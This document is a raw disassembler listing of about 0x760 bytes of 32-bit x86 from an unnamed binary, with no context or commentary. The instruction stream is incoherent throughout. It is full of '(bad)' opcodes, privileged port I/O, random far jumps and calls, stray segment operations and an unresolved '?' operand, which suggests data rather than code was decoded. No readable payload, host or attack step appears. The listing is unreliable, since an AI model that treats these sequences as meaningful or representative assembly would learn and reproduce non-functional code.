  40c475:	sbb    ah,BYTE PTR [ebx+ebx*2]
  40c478:	(bad)  
  40c479:	push   esi
  40c47a:	adc    eax,edi
  40c47c:	call   0xe6a112d3
  40c481:	sbb    al,0xee
  40c483:	test   BYTE PTR [ebp+0x3],ch
  40c486:	jo     0x40c46a
  40c488:	lods   eax,DWORD PTR ds:[esi]
  40c489:	nop
  40c48a:	sub    di,WORD PTR [edx+0xb]
  40c48e:	rcr    BYTE PTR [edi+0xa],0x60
  40c492:	les    ebx,FWORD PTR [edi-0x693a293]
  40c498:	aas    
  40c499:	imul   edi
  40c49b:	cwde   
  40c49c:	es pushf 
  40c49e:	xor    cl,BYTE PTR [ecx]
  40c4a0:	mov    ah,BYTE PTR [ebx+0x3267ca4a]
  40c4a6:	imul   edi,eax,0x45
  40c4a9:	dec    edi
  40c4aa:	and    ebx,DWORD PTR [edi]
  40c4ac:	stc    
  40c4ad:	out    dx,eax
  40c4ae:	cmp    ah,BYTE PTR [eax+0x1fa47b37]
  40c4b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4b5:	in     eax,0xa7
  40c4b7:	mov    ch,0xb7
  40c4b9:	mov    DWORD PTR [ebx+0x58],edx
  40c4bc:	dec    edx
  40c4bd:	mov    eax,0x31ae029a
  40c4c2:	dec    edi
  40c4c3:	out    dx,eax
  40c4c4:	mov    BYTE PTR [eax+0x68],ah
  40c4c7:	cmc    
  40c4c8:	xchg   ebx,eax
  40c4c9:	push   ds
  40c4ca:	push   edx
  40c4cb:	dec    ebp
  40c4cc:	ss push ds
  40c4ce:	add    BYTE PTR [ecx],0x78
  40c4d1:	ds out 0x51,eax
  40c4d4:	add    ecx,DWORD PTR [esi]
  40c4d6:	arpl   dx,sp
  40c4d8:	xor    BYTE PTR [edx-0x2cff4cfe],al
  40c4de:	sti    
  40c4df:	jmp    0xa5c9:0x585d205f
  40c4e6:	sub    al,0x9a
  40c4e8:	inc    eax
  40c4e9:	pop    ds
  40c4ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4eb:	inc    ebp
  40c4ec:	add    BYTE PTR [ebx+0x46],bl
  40c4ef:	or     al,0x31
  40c4f1:	dec    edx
  40c4f2:	fdivr  QWORD PTR fs:[ebx+0x5d100ae8]
  40c4f9:	in     al,dx
  40c4fa:	mov    ds:0xd37d34b1,al
  40c4ff:	mov    cl,bl
  40c501:	jp     0x40c4bd
  40c503:	push   ecx
  40c504:	mov    bh,0x7d
  40c506:	popf   
  40c507:	and    cl,BYTE PTR [esp+ebx*8+0x23]
  40c50b:	lahf   
  40c50c:	xchg   ecx,eax
  40c50d:	jp     0x40c53b
  40c50f:	pop    ds
  40c510:	or     eax,0x7865956
  40c515:	dec    eax
  40c516:	push   eax
  40c517:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c518:	pushf  
  40c519:	mov    ecx,0x47a7f407
  40c51e:	stc    
  40c51f:	das    
  40c520:	xchg   esp,eax
  40c521:	jg     0x40c4ba
  40c523:	mov    ah,0xf0
  40c525:	add    DWORD PTR [esi+ebx*1+0x552c6bf9],ecx
  40c52c:	cmp    dh,BYTE PTR [ecx]
  40c52e:	in     al,0x39
  40c530:	xor    ch,BYTE PTR [esi]
  40c532:	fsubrp st(5),st
  40c534:	jp     0x40c4b7
  40c536:	xchg   ebp,eax
  40c537:	mov    al,ds:0x3776548f
  40c53c:	xchg   BYTE PTR [ebx],dh
  40c53e:	xchg   esi,eax
  40c53f:	push   0x5f
  40c541:	inc    eax
  40c542:	sbb    eax,0x7936ec35
  40c547:	pop    ds
  40c548:	mov    edi,0x3c7235e5
  40c54d:	adc    eax,0xb41956d0
  40c552:	data16 mul BYTE PTR [ebx+edi*4]
  40c556:	jp     0x40c5d3
  40c558:	and    DWORD PTR [eax-0x6d],eax
  40c55b:	jmp    0x3a58:0x7df2a012
  40c562:	fstp   TBYTE PTR [edi+ecx*8]
  40c565:	lds    esi,FWORD PTR [edx+0x72]
  40c568:	daa    
  40c569:	xchg   DWORD PTR [ecx+0x3],eax
  40c56c:	ret    
  40c56d:	gs dec eax
  40c56f:	lea    eax,[eax]
  40c571:	mov    dl,0xdc
  40c573:	inc    ebx
  40c574:	mov    ah,BYTE PTR [edx+0x57]
  40c577:	fsub   DWORD PTR [ebx+esi*1-0x23b6316b]
  40c57e:	dec    ecx
  40c57f:	ja     0x40c5c5
  40c581:	mov    esp,DWORD PTR [ebx*1-0x2db1146d]
  40c588:	sub    DWORD PTR [ebx],esp
  40c58a:	or     esi,esp
  40c58c:	inc    esp
  40c58d:	bound  edx,QWORD PTR [edi+0x75]
  40c590:	data16 (bad) 
  40c592:	sub    eax,0xc63632f4
  40c597:	std    
  40c598:	call   0x195015b3
  40c59d:	rol    BYTE PTR [ebx-0x6f],1
  40c5a0:	mov    eax,ds:0x211aaea9
  40c5a5:	dec    ebx
  40c5a6:	loop   0x40c5ed
  40c5a8:	mov    esi,0x85b0e6cf
  40c5ad:	xchg   esp,eax
  40c5ae:	daa    
  40c5af:	out    dx,al
  40c5b0:	out    dx,eax
  40c5b1:	jmp    0xa746689c
  40c5b6:	push   eax
  40c5b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5b8:	das    
  40c5b9:	mov    bl,0x2b
  40c5bb:	fmul   st,st(0)
  40c5bd:	xchg   ecx,eax
  40c5be:	dec    edi
  40c5bf:	jae    0x40c5fc
  40c5c1:	mul    BYTE PTR [edi]
  40c5c3:	icebp  
  40c5c4:	inc    esi
  40c5c5:	jl     0x40c5ae
  40c5c7:	loope  0x40c5bf
  40c5c9:	jb     0x40c632
  40c5cb:	std    
  40c5cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5cd:	mov    ah,0xce
  40c5cf:	iret   
  40c5d0:	cmp    ch,BYTE PTR [ebp+ebp*2-0xf85c02]
  40c5d7:	imul   DWORD PTR [ecx-0x5b]
  40c5da:	mov    ah,0x4d
  40c5dc:	leave  
  40c5dd:	jp     0x40c59b
  40c5df:	sbb    DWORD PTR es:[ebp+0x596245fe],ebp
  40c5e6:	sahf   
  40c5e7:	ja     0x40c5e8
  40c5e9:	inc    edi
  40c5ea:	std    
  40c5eb:	mov    bl,0x9f
  40c5ed:	adc    ebx,eax
  40c5ef:	sub    eax,0xaa58ba1d
  40c5f4:	sub    al,0x98
  40c5f6:	lock sbb DWORD PTR [esi],ecx
  40c5f9:	or     BYTE PTR [ecx+0x7f],0x1a
  40c5fd:	mov    ebp,0x49a73654
  40c602:	fcom   DWORD PTR ds:0xb0145eae
  40c608:	popa   
  40c609:	cmp    edx,DWORD PTR [ecx+0x3c4b24c1]
  40c60f:	mov    dl,0xc8
  40c611:	jmp    0x40c67b
  40c613:	or     eax,0x822746d1
  40c618:	adc    BYTE PTR [eax+0x3c],al
  40c61b:	outs   dx,BYTE PTR ds:[esi]
  40c61c:	inc    eax
  40c61d:	add    al,0xdd
  40c61f:	push   esi
  40c620:	rol    DWORD PTR [eax],0xc3
  40c623:	xchg   DWORD PTR [esp+esi*2],esp
  40c626:	jmp    0xad05:0xc057243d
  40c62d:	xor    eax,DWORD PTR [ebx+0x558e4a64]
  40c633:	xadd   DWORD PTR [esi],edx
  40c636:	and    al,0x28
  40c638:	mov    al,ds:0x65450bb7
  40c63d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c63e:	sar    BYTE PTR [esi],1
  40c640:	int    0x88
  40c642:	es jae 0x40c66f
  40c645:	pusha  
  40c646:	mov    eax,0x3172552f
  40c64b:	fiadd  WORD PTR [ebx]
  40c64d:	lahf   
  40c64e:	es pusha 
  40c650:	xor    eax,0x1f95db
  40c655:	out    0xff,eax
  40c657:	mov    ebx,0xe45f5322
  40c65c:	pop    ss
  40c65d:	jo     0x40c669
  40c65f:	dec    ebp
  40c660:	mov    al,0x2f
  40c662:	loope  0x40c631
  40c664:	aad    0x4c
  40c666:	std    
  40c667:	jns    0x40c652
  40c669:	dec    edi
  40c66a:	aas    
  40c66b:	repz push edx
  40c66d:	add    bl,BYTE PTR [ecx-0x5d289205]
  40c673:	test   eax,0x35374ece
  40c679:	fs pop edx
  40c67b:	sub    eax,0xbc9a97a
  40c680:	xlat   BYTE PTR ds:[ebx]
  40c681:	les    edx,FWORD PTR [esi+edx*4-0x7fa82dd8]
  40c688:	stos   DWORD PTR es:[edi],eax
  40c689:	sbb    DWORD PTR [edi-0x6935c86d],0xba5bd88e
  40c693:	sbb    bh,BYTE PTR [edi]
  40c695:	arpl   WORD PTR [ebp+0x195a2aea],ax
  40c69b:	test   eax,0x15a538e2
  40c6a0:	jl     0x40c71c
  40c6a2:	push   edi
  40c6a3:	scas   al,BYTE PTR es:[edi]
  40c6a4:	mov    dh,0x76
  40c6a6:	repnz clc 
  40c6a8:	mov    esi,DWORD PTR [edx+0x2facc5d]
  40c6ae:	mov    eax,ds:0xd9380c2d
  40c6b3:	outs   dx,BYTE PTR ds:[esi]
  40c6b4:	mov    al,ds:0xa25f2f63
  40c6b9:	mov    ecx,0x2348b602
  40c6be:	mov    esp,0x4642dac7
  40c6c3:	cli    
  40c6c4:	pop    edx
  40c6c5:	push   cs
  40c6c6:	dec    edx
  40c6c7:	mov    eax,0xc1e1cda1
  40c6cc:	je     0x40c6e4
  40c6ce:	in     al,0x81
  40c6d0:	repz std 
  40c6d2:	ror    BYTE PTR [esi],1
  40c6d4:	adc    esp,DWORD PTR [esi]
  40c6d6:	sub    eax,DWORD PTR [edx+0x5b]
  40c6d9:	mov    ds:0x7bc1b732,eax
  40c6de:	jmp    0xab7d1aa0
  40c6e3:	and    al,0x9d
  40c6e5:	and    dl,bl
  40c6e7:	xor    eax,DWORD PTR [eax]
  40c6e9:	cmc    
  40c6ea:	ror    BYTE PTR [ebx+0x7b],1
  40c6ed:	std    
  40c6ee:	lds    esi,FWORD PTR [edx-0x3a]
  40c6f1:	xlat   BYTE PTR ds:[ebx]
  40c6f2:	xchg   edi,eax
  40c6f3:	adc    edx,ebp
  40c6f5:	pop    ebp
  40c6f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6f7:	jno    0x40c6b0
  40c6f9:	cli    
  40c6fa:	inc    ecx
  40c6fb:	xchg   ebx,eax
  40c6fc:	stos   DWORD PTR es:[edi],eax
  40c6fd:	in     al,0xc1
  40c6ff:	sub    bh,BYTE PTR [eax+0x42]
  40c702:	ror    BYTE PTR [ebp-0x38c0849],0x7a
  40c709:	xlat   BYTE PTR ds:[ebx]
  40c70a:	pop    ebp
  40c70b:	test   DWORD PTR [ecx],ebp
  40c70d:	stos   DWORD PTR es:[edi],eax
  40c70e:	imul   edx,DWORD PTR [ebp-0x1deaef42],0xffffffc6
  40c715:	(bad)  
  40c717:	test   BYTE PTR ds:0xea5f3bfa,0x24
  40c71e:	sbb    al,0x63
  40c720:	cld    
  40c721:	push   esi
  40c722:	or     ebp,DWORD PTR ds:0x524ac758
  40c728:	jmp    0x51f5b669
  40c72d:	ret    0xcd92
  40c730:	(bad)  
  40c731:	ja     0x40c6da
  40c733:	xor    al,0x83
  40c735:	pushf  
  40c736:	pop    ebp
  40c737:	sbb    DWORD PTR [ecx],0xffffff87
  40c73a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c73b:	retf   0xa91
  40c73e:	mov    edx,0x2693222f
  40c743:	in     al,0x3c
  40c745:	loopne 0x40c6d9
  40c747:	xor    eax,0xe8596f22
  40c74c:	loop   0x40c6e6
  40c74e:	push   0xaa693cb3
  40c753:	fs mov esi,0x34e90da4
  40c759:	push   0x841e5c81
  40c75e:	into   
  40c75f:	sbb    al,0x2a
  40c761:	std    
  40c762:	sub    eax,0xf1536e73
  40c767:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c768:	or     ecx,esi
  40c76a:	mov    DWORD PTR [ebp-0x7a],eax
  40c76d:	jge    0x40c703
  40c76f:	outs   dx,BYTE PTR ds:[esi]
  40c770:	pop    edi
  40c771:	sbb    edi,DWORD PTR [ebp+0x178f5025]
  40c777:	mov    DWORD PTR [esi+0x608f7f6c],edi
  40c77d:	ja     0x40c7d4
  40c77f:	mov    bh,0xef
  40c781:	cmp    al,0x9a
  40c783:	xor    esp,esi
  40c785:	push   es
  40c786:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c787:	xchg   esi,eax
  40c788:	rcr    DWORD PTR [edx],cl
  40c78a:	cmp    DWORD PTR [ebp+ebp*2-0x69],edx
  40c78e:	(bad)  
  40c790:	jge    0x40c7f0
  40c792:	jg     0x40c7bf
  40c794:	jmp    0xa1c8:0xe6f100e5
  40c79b:	mov    esp,0x34f76028
  40c7a0:	test   eax,0x873661
  40c7a5:	add    eax,esi
  40c7a7:	push   cs
  40c7a8:	mov    al,cl
  40c7aa:	test   BYTE PTR [edx-0x2a],dl
  40c7ad:	mov    bl,0x54
  40c7af:	(bad)  
  40c7b0:	daa    
  40c7b1:	sbb    DWORD PTR [esp+eiz*4-0x6971f6ba],ebp
  40c7b8:	xchg   esp,eax
  40c7b9:	test   eax,0x3470cc0d
  40c7be:	lea    esi,[edx-0x4e]
  40c7c1:	push   edi
  40c7c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7c3:	mov    ch,0x8f
  40c7c5:	aaa    
  40c7c6:	hlt    
  40c7c7:	mov    WORD PTR [edx-0x7a06f2cc],?
  40c7cd:	fwait
  40c7ce:	out    dx,al
  40c7cf:	outs   dx,DWORD PTR ds:[esi]
  40c7d0:	sub    eax,0x83bdb991
  40c7d5:	push   cs
  40c7d6:	mov    eax,0xa61804a2
  40c7db:	mov    al,0x89
  40c7dd:	popf   
  40c7de:	or     al,0x1f
  40c7e0:	jecxz  0x40c7dd
  40c7e2:	out    0xbb,eax
  40c7e4:	sbb    esi,DWORD PTR [ebp+0x6]
  40c7e7:	dec    ebp
  40c7e8:	(bad)  
  40c7e9:	in     eax,0xf2
  40c7eb:	iret   
  40c7ec:	outs   dx,BYTE PTR ds:[esi]
  40c7ed:	aaa    
  40c7ee:	mov    ebp,0x5924e073
  40c7f3:	xchg   edi,eax
  40c7f5:	xchg   edi,eax
  40c7f6:	mov    al,ds:0xfdf248ab
  40c7fb:	mov    BYTE PTR [ebx],ah
  40c7fd:	xchg   ebx,eax
  40c7fe:	adc    al,0xc1
  40c800:	fsubr  DWORD PTR [edi]
  40c802:	cmp    DWORD PTR [eax],ebp
  40c804:	sub    DWORD PTR [ecx-0x2d],ebp
  40c807:	inc    ecx
  40c808:	xchg   esp,ebx
  40c80a:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c80c:	inc    edi
  40c80d:	jbe    0x40c85a
  40c80f:	add    al,0xbc
  40c811:	scas   eax,DWORD PTR es:[edi]
  40c812:	(bad)  
  40c813:	add    bh,cl
  40c815:	push   esi
  40c816:	ret    0xeca9
  40c819:	aad    0xb6
  40c81b:	inc    ebx
  40c81c:	repnz retf 0x257c
  40c820:	cmc    
  40c821:	clc    
  40c822:	cmp    eax,0xc628a23b
  40c827:	xor    al,0x19
  40c829:	fdivr  DWORD PTR [esi+0x31]
  40c82c:	mov    edi,0xc300fa9d
  40c831:	dec    ecx
  40c832:	call   0xf48361d2
  40c837:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c838:	adc    DWORD PTR [esi+0x66],0xffffffa8
  40c83c:	jl     0x40c87c
  40c83e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c83f:	lods   eax,DWORD PTR ds:[esi]
  40c840:	ret    0x5c5f
  40c843:	mov    al,ds:0xb18fd9e3
  40c848:	out    dx,al
  40c849:	mov    eax,0xd8b03fb
  40c84e:	push   0xffffffa1
  40c850:	mov    ds:0xbc8f737,al
  40c855:	push   es
  40c856:	mov    edi,0x60c1593d
  40c85b:	and    DWORD PTR [eax+0x25],0x805b6f5b
  40c862:	lock xor dl,0xda
  40c866:	and    dh,0xe6
  40c869:	call   0xad9c9457
  40c86e:	imul   edx,edi,0xb4ecd616
  40c874:	sub    ebp,DWORD PTR [ecx]
  40c876:	lahf   
  40c877:	sbb    al,0x18
  40c879:	sbb    al,BYTE PTR [esi]
  40c87b:	xchg   edi,eax
  40c87c:	sub    ecx,esp
  40c87e:	jno    0x40c8f5
  40c880:	mov    al,0x74
  40c882:	sbb    bh,0x3d
  40c885:	adc    DWORD PTR [edi-0x19],ebp
  40c888:	push   edi
  40c889:	(bad)  
  40c88a:	adc    eax,DWORD PTR [ebp-0x4b]
  40c88d:	dec    eax
  40c88e:	fscale 
  40c890:	dec    ecx
  40c891:	and    eax,0xa29e548a
  40c896:	jb     0x40c832
  40c898:	cmp    eax,0xa7f1ddad
  40c89d:	mov    ch,0x0
  40c89f:	fld    QWORD PTR [ebx+0x16]
  40c8a2:	in     al,dx
  40c8a3:	mov    ds:0x677914a1,al
  40c8a8:	xor    dh,BYTE PTR [edi]
  40c8aa:	mov    esi,0xc9e2b56b
  40c8af:	pop    edx
  40c8b0:	or     ecx,DWORD PTR [ecx]
  40c8b2:	test   edx,edx
  40c8b4:	or     DWORD PTR [ecx],esi
  40c8b6:	jns    0x40c861
  40c8b8:	in     al,dx
  40c8b9:	push   eax
  40c8ba:	pop    ebx
  40c8bb:	sbb    eax,0xda50ce1
  40c8c0:	mov    ch,0x40
  40c8c2:	call   0x467f:0x432fca1d
  40c8c9:	sti    
  40c8ca:	add    al,0x95
  40c8cc:	rcr    DWORD PTR [edx+eax*8+0x47],0x13
  40c8d1:	push   cs
  40c8d2:	int3   
  40c8d3:	dec    esp
  40c8d4:	sub    BYTE PTR [esi],cl
  40c8d6:	add    esi,ecx
  40c8d8:	aam    0xd
  40c8da:	call   0xfdd5edcc
  40c8df:	mov    ds:0xd8640e08,al
  40c8e4:	into   
  40c8e5:	push   ss
  40c8e6:	pop    ds
  40c8e7:	(bad)  
  40c8e8:	int    0x6f
  40c8ea:	stc    
  40c8eb:	pop    ss
  40c8ec:	js     0x40c8a3
  40c8ee:	push   ebp
  40c8ef:	pop    ss
  40c8f0:	idiv   BYTE PTR [esi+0x4e81c230]
  40c8f6:	rol    BYTE PTR [edx+0x6d],cl
  40c8f9:	lock addr16 push eax
  40c8fc:	ds iret 
  40c8fe:	dec    ebx
  40c8ff:	(bad)  
  40c900:	jp     0x40c926
  40c902:	push   ebp
  40c903:	xor    bh,BYTE PTR [edx-0x7a]
  40c906:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c907:	mov    DWORD PTR ds:0xe6e50e89,edx
  40c90d:	es imul esp,ebx,0xffffffa6
  40c911:	(bad)  
  40c912:	adc    BYTE PTR [edx-0x5b],ch
  40c915:	jnp    0x40c8f0
  40c917:	clc    
  40c918:	pop    esp
  40c919:	and    esp,ecx
  40c91b:	xchg   edi,eax
  40c91c:	enter  0x3bbf,0xa
  40c920:	jns    0x40c8b8
  40c922:	or     al,0xc7
  40c924:	jns    0x40c8ff
  40c926:	out    0x7d,eax
  40c928:	xor    DWORD PTR [edi+0x78634c01],0x598ddf0c
  40c932:	ja     0x40c8d9
  40c934:	stos   BYTE PTR es:[edi],al
  40c935:	sbb    al,cl
  40c937:	shr    DWORD PTR [edi+0x72],0x86
  40c93b:	in     al,dx
  40c93c:	add    BYTE PTR [edx],bh
  40c93e:	pusha  
  40c93f:	fldenv [eax-0x19232ed4]
  40c945:	xor    ecx,DWORD PTR ds:0x3d2071ea
  40c94b:	jmp    0x58a5:0x936697a8
  40c952:	fld    TBYTE PTR [ebx]
  40c954:	mov    dh,BYTE PTR [ebp+0x74e85c89]
  40c95a:	jns    0x40c93a
  40c95c:	sahf   
  40c95d:	pop    ebx
  40c95e:	mov    dh,0x6e
  40c960:	and    cl,ah
  40c962:	stc    
  40c963:	push   ecx
  40c964:	inc    ebx
  40c965:	adc    eax,0x54d96179
  40c96a:	add    ebp,DWORD PTR [edx-0x32179046]
  40c970:	cmp    al,0x5e
  40c972:	pop    es
  40c973:	mov    ds:0xb727da22,al
  40c978:	push   cs
  40c979:	ret    0xb7ec
  40c97c:	inc    esi
  40c97d:	pop    edx
  40c97e:	and    al,0xa3
  40c980:	ret    0x491a
  40c983:	pop    eax
  40c984:	rol    BYTE PTR [ebx+esi*1+0x7b],cl
  40c988:	aaa    
  40c989:	mov    edi,0x78bb7d8
  40c98e:	cld    
  40c98f:	mov    al,0x5c
  40c991:	addr16 ja 0x40c9f7
  40c994:	data16 and al,0x5d
  40c997:	push   ebp
  40c998:	xchg   esi,eax
  40c999:	cwde   
  40c99a:	sbb    ah,BYTE PTR [ecx-0x71]
  40c99d:	sbb    al,0x74
  40c99f:	jno    0x40ca1c
  40c9a1:	shl    esi,0x77
  40c9a4:	sahf   
  40c9a5:	sahf   
  40c9a6:	push   ebx
  40c9a7:	pop    eax
  40c9a8:	jb     0x40ca01
  40c9aa:	(bad)  
  40c9ab:	aam    0xb4
  40c9ad:	fwait
  40c9ae:	sub    al,0xd1
  40c9b0:	clc    
  40c9b1:	jno    0x40ca10
  40c9b3:	pop    esi
  40c9b4:	outs   dx,BYTE PTR ds:[esi]
  40c9b5:	jns    0x40c9db
  40c9b7:	pusha  
  40c9b8:	cmc    
  40c9b9:	call   0xd7ec3afd
  40c9be:	ror    BYTE PTR [ebp-0x39a629],cl
  40c9c4:	add    edi,DWORD PTR [edx-0x4ddec6f1]
  40c9ca:	into   
  40c9cb:	push   cs
  40c9cc:	or     esp,DWORD PTR [edi+0x4fe5fb73]
  40c9d2:	aad    0xd9
  40c9d4:	clc    
  40c9d5:	mov    ebx,0xe7f14767
  40c9da:	or     esi,DWORD PTR [ebp+0x3d]
  40c9dd:	xchg   edx,eax
  40c9de:	cmp    DWORD PTR es:[ecx+edi*1],edx
  40c9e2:	(bad)  [edx]
  40c9e4:	push   eax
  40c9e5:	inc    eax
  40c9e6:	mov    ecx,0xbcad10ca
  40c9eb:	and    esi,DWORD PTR [esi+eax*1]
  40c9ee:	call   FWORD PTR [edx+0x5b225d8d]
  40c9f4:	dec    edi
  40c9f5:	sub    bl,ch
  40c9f7:	ja     0x40c9dd
  40c9f9:	clc    
  40c9fa:	out    0x57,eax
  40c9fc:	add    eax,0x89559b6b
  40ca01:	imul   edx
  40ca03:	mov    ch,0x88
  40ca05:	mov    ebx,0xaa04861e
  40ca0a:	adc    ah,BYTE PTR ss:[ebx-0x8a46282]
  40ca11:	rcr    bl,1
  40ca13:	jo     0x40c9f6
  40ca15:	or     dh,dl
  40ca17:	or     DWORD PTR [ebx-0x6],eax
  40ca1a:	mov    WORD PTR [edx+edx*2-0x58],?
  40ca1e:	mov    esp,0x2a7f1ac9
  40ca23:	ret    0x65f3
  40ca26:	shr    BYTE PTR [ebp-0x30],0x74
  40ca2a:	pop    es
  40ca2b:	xchg   ebx,eax
  40ca2c:	adc    ebp,DWORD PTR [edx+0x71794e6b]
  40ca32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca33:	icebp  
  40ca34:	outs   dx,DWORD PTR ds:[esi]
  40ca35:	add    eax,ecx
  40ca37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca38:	push   ds
  40ca39:	cmp    al,0x56
  40ca3b:	xchg   esp,eax
  40ca3c:	xchg   ebp,eax
  40ca3d:	cld    
  40ca3e:	out    0x18,al
  40ca40:	sbb    ecx,DWORD PTR [edi-0x199ca0ec]
  40ca46:	mov    dh,0x42
  40ca48:	sahf   
  40ca49:	pusha  
  40ca4a:	cmp    ch,BYTE PTR es:[esi+ecx*1+0x10279c18]
  40ca52:	lods   eax,DWORD PTR ds:[esi]
  40ca53:	das    
  40ca54:	arpl   WORD PTR [esi+0x7c],cx
  40ca57:	je     0x40c9f0
  40ca59:	mov    eax,0x3f181dd3
  40ca5e:	and    ah,0xba
  40ca61:	fadd   DWORD PTR [esi]
  40ca63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca64:	push   ebx
  40ca65:	js     0x40cadf
  40ca67:	adc    ah,BYTE PTR [eax-0x7d454646]
  40ca6d:	push   ebx
  40ca6e:	scas   eax,DWORD PTR es:[edi]
  40ca6f:	sub    eax,0x11fd7d09
  40ca74:	sub    cl,BYTE PTR [edi]
  40ca76:	inc    ebp
  40ca77:	push   esi
  40ca78:	add    BYTE PTR gs:[edi+ebp*8],dh
  40ca7c:	std    
  40ca7d:	mov    al,ds:0xe01f6585
  40ca82:	cld    
  40ca83:	cmp    esi,edi
  40ca85:	in     al,dx
  40ca86:	xchg   esi,eax
  40ca87:	dec    ecx
  40ca88:	jae    0x40ca7b
  40ca8a:	arpl   bp,ax
  40ca8c:	adc    esp,DWORD PTR [ebx-0x386abd82]
  40ca92:	fs xor eax,0x103d6a07
  40ca98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca99:	cmp    bh,BYTE PTR [ebp+0x598de8cb]
  40ca9f:	repnz sub edi,DWORD PTR [ecx+0x57abae00]
  40caa6:	stos   DWORD PTR es:[edi],eax
  40caa7:	push   0xa77e7bdc
  40caac:	call   0x21d7:0x67a90288
  40cab3:	pop    ebp
  40cab4:	aad    0x71
  40cab6:	mov    bl,0xf8
  40cab8:	hlt    
  40cab9:	mov    ss,WORD PTR [edi-0x497d3cb1]
  40cabf:	popf   
  40cac0:	sub    BYTE PTR [ebx+0x2b16bc57],0xa7
  40cac7:	push   ecx
  40cac8:	push   ebp
  40cac9:	jne    0x40ca9d
  40cacb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cacc:	daa    
  40cacd:	fst    QWORD PTR [ebp-0x5a]
  40cad0:	ins    BYTE PTR es:[edi],dx
  40cad1:	int3   
  40cad2:	test   BYTE PTR [eax+eiz*4+0x49983d41],cl
  40cad9:	inc    eax
  40cada:	cld    
  40cadb:	in     eax,0xaa
  40cadd:	inc    esp
  40cade:	inc    esi
  40cadf:	out    dx,eax
  40cae0:	cmp    al,0xbc
  40cae2:	fwait
  40cae3:	sub    cl,BYTE PTR [ecx+0x58273e1d]
  40cae9:	jae    0x40cb08
  40caeb:	sbb    BYTE PTR [ebx],dl
  40caed:	leave  
  40caee:	lods   al,BYTE PTR ds:[esi]
  40caef:	pop    ss
  40caf0:	sub    dl,BYTE PTR [edi+0x52]
  40caf3:	jae    0x40ca76
  40caf5:	dec    ecx
  40caf6:	mov    eax,ds:0xd3838bf4
  40cafb:	jle    0x40cb2d
  40cafd:	cmp    ebp,DWORD PTR ds:0x1b020091
  40cb03:	lea    esi,[ecx]
  40cb05:	add    BYTE PTR [eax+eiz*2-0x7e05ca7a],bl
  40cb0c:	dec    BYTE PTR [eax+ecx*8-0x27]
  40cb10:	adc    al,0xeb
  40cb12:	jbe    0x40ca96
  40cb14:	dec    ecx
  40cb15:	sti    
  40cb16:	dec    esp
  40cb17:	or     ecx,DWORD PTR [esi]
  40cb19:	xchg   BYTE PTR [ebp-0x22e3beae],al
  40cb1f:	in     eax,0xcb
  40cb21:	imul   esi,eax,0x6faeeedb
  40cb27:	and    BYTE PTR ds:0x4722f086,ch
  40cb2d:	das    
  40cb2e:	xchg   ebp,eax
  40cb2f:	sub    bh,BYTE PTR [ebx+0x2f]
  40cb32:	or     BYTE PTR [esi],ah
  40cb34:	(bad)  
  40cb35:	pop    edx
  40cb36:	xchg   esp,eax
  40cb37:	sub    bl,0x62
  40cb3a:	scas   al,BYTE PTR es:[edi]
  40cb3b:	rsqrtps xmm1,XMMWORD PTR [esp+esi*1]
  40cb3f:	pop    ss
  40cb40:	push   ebx
  40cb41:	stos   BYTE PTR es:[edi],al
  40cb42:	je     0x40cb16
  40cb44:	dec    ebp
  40cb45:	jns    0x40cba6
  40cb47:	ss push ebx
  40cb49:	mov    esp,0xcdf60686
  40cb4e:	adc    edx,esi
  40cb50:	imul   eax,DWORD PTR [edx+0x1d29a2d1],0xe47b1406
  40cb5a:	out    0x45,al
  40cb5c:	jecxz  0x40cbaf
  40cb5e:	push   ss
  40cb5f:	cmc    
  40cb60:	mov    ah,0xc
  40cb62:	xor    al,0xd3
  40cb64:	aaa    
  40cb65:	jmp    0xc29c8f14
  40cb6a:	cmp    BYTE PTR [ebp-0x7df209ef],cl
  40cb70:	mov    dh,0xc6
  40cb72:	xor    DWORD PTR [eax+ebx*2],edx
  40cb75:	pop    esi
  40cb76:	ret    0x5771
  40cb79:	xor    al,0xe4
  40cb7b:	xchg   esi,eax
  40cb7d:	adc    DWORD PTR [ebx+edi*4],esi
  40cb80:	and    DWORD PTR [edi+0x5705330f],esi
  40cb86:	or     eax,0x3149f216
  40cb8b:	test   eax,0x31195330
  40cb90:	xor    eax,DWORD PTR [ebx]
  40cb92:	fimul  DWORD PTR [edi+0x2f]
  40cb95:	push   edx
  40cb96:	jge    0x40cbe7
  40cb98:	fnstcw WORD PTR [edi]
  40cb9a:	and    BYTE PTR [eax],0x26
  40cb9d:	add    edi,DWORD PTR [ebx+0x40d47872]
  40cba3:	add    al,0x86
  40cba5:	or     DWORD PTR ds:0xe7442285,ebx
  40cbab:	cmp    eax,0x8c972861
  40cbb0:	dec    edi
  40cbb1:	cs inc esi
  40cbb3:	cmp    al,0x47
  40cbb5:	push   eax
  40cbb6:	fs loop 0x40cb90
  40cbb9:	mov    dl,ch
  40cbbb:	cdq    
  40cbbc:	(bad)  
  40cbbd:	pop    edi
  40cbbe:	push   esi
  40cbbf:	mov    bh,0x8
  40cbc1:	dec    ebx
  40cbc2:	dec    eax
  40cbc3:	xor    cl,dh
  40cbc5:	adc    dl,bh
  40cbc7:	aad    0x38
  40cbc9:	aad    0x22
  40cbcb:	jbe    0x40cbd5
  40cbcd:	push   0xffffff80
  40cbcf:	int    0x7a
  40cbd1:	inc    esp
